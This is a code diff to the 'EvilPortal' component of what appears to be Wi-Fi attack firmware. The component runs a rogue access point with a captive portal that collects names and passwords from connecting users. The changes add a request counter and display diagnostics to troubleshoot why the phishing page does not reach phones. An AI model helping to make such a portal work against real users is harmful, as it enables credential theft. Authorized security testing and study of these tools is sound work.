@@ -85,12 +85,10 @@ String EvilPortal::get_password() {
 
 void EvilPortal::setupServer() {
   server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
+    this->http_hits++;
     request->send(200, "text/html", index_html ? index_html : "");
     #ifndef MARAUDER_V8
       Serial.println(F("client connected"));
-    #endif
-    #ifdef HAS_SCREEN
-      this->sendToDisplay(F("Client connected to server"));
     #endif
   });
 
@@ -108,6 +106,7 @@ void EvilPortal::setupServer() {
   for (int i = 0; i < sizeof(captiveEndpoints) / sizeof(captiveEndpoints[0]); i++) {
     
     server.on(captiveEndpoints[i], HTTP_GET, [this](AsyncWebServerRequest *request){
+      this->http_hits++;
       request->send(200, "text/html", index_html ? index_html : "");
     });
   }
@@ -367,6 +366,13 @@ void EvilPortal::startAP() {
   #endif
   #ifdef HAS_SCREEN
     this->sendToDisplay(F("Evil Portal READY"));
+    // Diagnostics (main-task context, display-safe): confirm the AP is up with
+    // an IP, and that the portal HTML actually loaded. If "HTML 0b" shows, the
+    // SD page wasn't read; if an IP shows but the phone never bumps the request
+    // counter (see main()), the captive DNS redirect isn't reaching us.
+    this->sendToDisplay("AP IP: " + WiFi.softAPIP().toString());
+    this->sendToDisplay("HTML " + (String)(index_html ? strlen(index_html) : 0) +
+                        "b  page: " + this->target_html_name);
   #endif
 }
 
@@ -401,6 +407,17 @@ void EvilPortal::main(uint8_t scan_mode) {
   }
 
   this->dnsServer.processNextRequest();
+
+  // Diagnostics: surface, from the main task, how many HTTP requests the portal
+  // has actually received. If this climbs when the phone connects, the captive
+  // redirect + server are reaching us and any "no page" is a content issue; if
+  // it stays at 0, the phone's request never arrives (DNS/redirect/ softAP).
+  #ifdef HAS_SCREEN
+    if (this->http_hits != this->http_hits_shown) {
+      this->http_hits_shown = this->http_hits;
+      this->sendToDisplay("portal reqs: " + (String)this->http_hits);
+    }
+  #endif
 
   if (this->name_received && this->password_received) {
     this->name_received = false;
